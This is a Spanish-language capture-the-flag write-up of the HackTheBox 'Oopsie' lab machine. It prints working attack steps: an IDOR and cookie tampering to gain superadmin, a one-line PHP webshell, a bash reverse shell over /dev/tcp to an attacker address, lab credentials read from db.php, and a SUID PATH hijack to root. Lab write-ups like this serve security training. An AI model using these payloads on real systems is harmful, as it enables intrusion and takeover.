Estado
PWNED

Escenario

Oopsie es una máquina Linux del Starting Point de HackTheBox con IP 10.129.86.20. La aplicación web tiene un panel de login para administración de MegaCorp Auto, con una vulnerabilidad de IDOR que permite a un usuario invitado obtener el rol de Super Admin manipulando cookies.

Una vez con acceso de Super Admin, se puede subir una PHP webshell. Las credenciales encontradas en archivos del servidor permiten escalar a otro usuario, y un binario SUID con PATH hijacking lleva a root.

Explotación — IDOR + Cookie Manipulation

Enumeración de cuentas vía IDOR en el panel de cuentas:

# El parámetro id en /cdn-cgi/login/admin.php?content=accounts&id= es vulnerable a IDOR
curl -s "http://10.129.86.20/cdn-cgi/login/admin.php?content=accounts&id=1" \
  -H "Cookie: user=2233; role=guest"
Access ID: 34322  Name: admin  Email: admin@megacorp.com

Escalada de rol manipulando cookies:

# Cambiar la cookie con el Access ID del admin y rol superadmin
Cookie: user=34322; role=superadmin

# Ahora tenemos acceso a /cdn-cgi/login/admin.php?content=uploads
Panel de subida de archivos desbloqueado

Subida de PHP webshell:

# shell.php
<?php system($_GET['cmd']); ?>

curl -s "http://10.129.86.20/uploads/shell.php?cmd=id"

curl "http://10.129.86.20/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.X/4444+0>%261'"

Cadena de Ataque

Paso 1
Web Enumeration → Panel de Login
Gobuster descubre /cdn-cgi/login. Login como Guest con acceso limitado a la aplicación de gestión.
Paso 2
IDOR → Access ID del Admin
El parámetro id en el panel de cuentas expone el Access ID del administrador: 34322.
Paso 3
Cookie Manipulation → Super Admin
Modificación de cookies a user=34322; role=superadmin para acceder al panel de subida de archivos.
Paso 4
PHP Shell Upload → RCE como www-data
Subida de webshell PHP al directorio /uploads/. Ejecución de comandos como www-data y obtención de reverse shell.
Paso 5
db.php → Credenciales de Robert
Archivo db.php contiene credenciales: robert:M3g4c0rp123. Escalada horizontal a usuario robert con user flag.
Paso 6
SUID bugtracker + PATH Hijack → root
Binario SUID bugtracker llama a cat sin ruta absoluta. PATH hijacking con cat malicioso en /tmp → root shell.
